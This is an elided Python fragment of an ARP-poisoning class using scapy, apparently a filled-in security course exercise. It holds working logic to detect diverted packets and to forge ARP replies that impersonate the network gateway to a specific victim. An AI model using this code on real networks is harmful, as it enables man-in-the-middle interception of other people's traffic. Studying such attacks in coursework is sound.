...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet):
        ...
        """
        return True if  packet[S.Ether].dst == self.gateway_mac and packet[S.IP].src != self.our_ip else False
    ...
    def is_stolen_packet(self, packet):
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        return True if packet[S.IP].dst != self.our_ip and packet[S.Ether].dst == self.our_mac else False
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        return S.ARP(op=2, hwsrc=self.our_mac, psrc=self.gateway_ip,   hwdst=victim_packet[S.Ether].src, pdst=victim_packet[S.IP].src)
